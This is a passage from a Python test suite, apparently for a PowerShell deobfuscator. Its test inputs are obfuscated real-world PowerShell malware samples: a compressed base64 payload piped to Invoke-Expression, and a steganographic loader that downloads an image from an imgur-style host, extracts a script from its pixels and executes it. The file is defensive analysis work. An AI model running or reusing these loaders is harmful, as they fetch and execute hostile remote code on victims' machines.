lIpGq7','ZNQv','qcMtMKxRaavRz46M9ucYC/wNRK31J4BdEW92Y143i2yeJ6snixM4r4x5pDLjJUKw/IFcRtlqwzt/BQU6IeJ1W','fHP/3492v/8v7p++/ffzx/fY/t9fH6zfbd+28f3v9x/nq8vr09fv/Hx9vj7e1+e/zhb1rzeNFu/wM=','hEK9CRPvTFuaTJTYKISTuoFaq6Kt','pbjK3Ntapgzb1SbaGX9tHXoDOqwmFwwBk','ZQOJ2O8wYriHy8BSApmcLGJFViIs35XeieqwPQbU0YxNC5','N1PJNB','WK2hlm+2VUWpQ0bqfGFiWj','l4s4yccl5hNyh4sqvNk2CRNQ4ayDx','GlHolZ','f9/MWBCS0FV74AMMhKhplCBvFNnKFAwcysnDw','81Q9vAWuWUnmFWCMhOoevgulipLpHKtC+qdykAS','1rI+xZScS0eFFBi2rl4GrMcR0SkBLKpmm','UJ','Y1Z2PMoFHhMVxAU','i9VYlK9qdjFpFoglBbVS9LPRaQ2+Tso8','IFrV0yBGVzWUOg3XFhVQwe','AnSeR4TwXcKNYaco6+dNpC+qKaBbQEa2wloPa','yrS4TeOX09MgUJx00b0c6IHgQ6cirJxMoX7YZRFyG5YzDF9KW0pb','DMkLX1l','A88ga+9B/TQo1Q+mwvXyU7vnu','KqbDgrxCy8w','E1hhzA6HYjp4VSV66hqtUTSLRgqm3bw9DR38jMd9','owEkHatt0j32yfiparFjiodOWSoR51cpVJ+jEc','NlMIXB8tLsdg','ijIW7fRdjl7boNbt65yTkQNhwVL0HCAQyY7pev4bcY6ruDIXToexZ/lu32HQM9p8DxlJeXJ6','6xd1p82l6DFjX9wMI+1Xr','jXrm8tHS3r0DC1vlJLNYrjQ','U7pE4U2P7MzYVoBU9Uqeetq4SlkaSJHXqQR2gg0LUyswTR2sT61O+vD1NqDSgnTF05bIUglXhUpvdEtWfsrbGIrU2juRTWFqYdL4+','5cQAJhaLJw3vArTnX','T0t0NGSoQ0RiwpfHQSVSWbLahQF9BSp2YzgjCp1wgYiO9WqHnXCAdMxzBV5d3o68jCPwHtBiZ',
                    'mu2a6lB+/XbQGGiOmamMsbRZBLE+BQRrC0eI4sbNE5BEywjJjqL0veEU6/0UwsW9NwMxL0/RRN4G0SHGLJm3Oa24n','IO3wLU')),
                [syStEm.Io.CoMPressioN.COMprEssionmode]::"dECOm`p`RESs")
                |&("{1}{0}{2}"-f 'E','foR','aCh') { .("{2}{0}{1}" -f '-o','bjecT','nEW') ("{3}{2}{4}{0}{1}"-f 'm','reaDER','o.str','SYSTem.i','Ea')( `${_} , [sysTEM.tExT.enCODiNg]::"a`scII")} )."rEAd`ToEnD"( ) |&( `${VER`BOsE`pre`Fe`REnce}."tOS`TrIng"()[1,3]+'x'-JoiN'')"\" | &( $pshOme[21]+$pSHome[30]+'x')
            '''
        ))

    def test_real_world_04(self):
        result = self.unit(BR'''
            &("{1}{0}" -f 'l', 'sa') ("{0}{1}" -f 'e', 'ni') ("{3}{1}{0}{2}" -f 'w-Obj', 'e', 'ect', 'N'); .("{1}{0}" -f 'd-Type', 'Ad') -AssemblyName ("{3}{0}{1}{2}" -f 'em', '.Drawin', 'g', 'Syst'); ${Tm} = (&("{1}{3}{0}{2}" -f 'do', 'Ge', 'm', 't-Ran') ("{2}{3}{4}{1}{5}{0}{6}" -f 'HHD.', 'om3', 'h7', '7', '9s:334.4mgur.c', '6q5q', '9ng'), ("{7}{1}{2}{8}{6}{0}{5}{4}{3}{9}" -f 'om386', '77', '9s:3', '51', '03', '3a', '4mages2.4mgbox.c', 'h', '3', 'TUnraE_o.9ng'))."RepLa`cE"('3', '/'); ${T`m} = (${Tm}."re`pLaCE"('4', 'i'))."REp`LAcE"('9', 'p'); ${rY} = [System.Net.WebRequest]::"CR`eATE"(${T`m}."r`EPLa`Ce"('7', 't')); ${r`Y}."mE`ThOD" = ("{0}{1}" -f 'HEA', 'D'); ${RA} = ${R`Y}."GetR`E`SP`oNsE"(); ${fF} = ${RA}."coNteN`T`LE`NgtH"; if (${F`F} -ge 1000) {
                ${g} = .("{1}{0}" -f 'ni', 'e') ("{4}{2}{6}{3}{5}{1}{0}" -f 'ap', 'Bitm', 'em.Draw', 'ng', 'Syst', '.', 'i')((.("{1}{0}" -f 'ni', 'e') ("{1}{2}{0}" -f 'lient', 'Net.We', 'bC'))."OP`E`NreAD"(${t`m}."Re`pl`AcE"('7', 't'))); ${o} = &("{0}{1}" -f 'e', 'ni') ("{1}{2}{0}" -f 'e[]', 'B', 'yt') 46080; (0..95) | &('%') { foreach (${x} in(0..479)) {
                ${p} = ${g}."gET`PI`Xel"(${X}, ${_}); .("{1}{0}" -f 'al', 's') ('Eg') ("{1}{0}" -f 'X', 'Ie'); ${o}[${_} * 480 + ${X}] = ([math]::"flo`oR"((${P}."B"-band15) * 16)-bor(${P}."g"-band 15))
            } }; &('eg')('( N' + [System.Text.Encoding]::"u`Tf8"."ge`TS`T`RinG"(${o}[0..45996])); break;
        }''')
        for keyword in (B'System.Drawing', B'New-Object', B'Net.WebClient'):
            self.assertIn(keyword, result)

    def test_multiple_occurrences(self):
        self.assertEqual(
            self.unit(
                b'"{10}{1}{0}{5}{9}{7}{8}{7}{3}{6}{2}{7}{4}{4}{10}{5}{1}"'
                b"-f'v','n','r','x','s','o','p','e','-','k','i'"
            ),
            b'"invoke-expression"'
        )
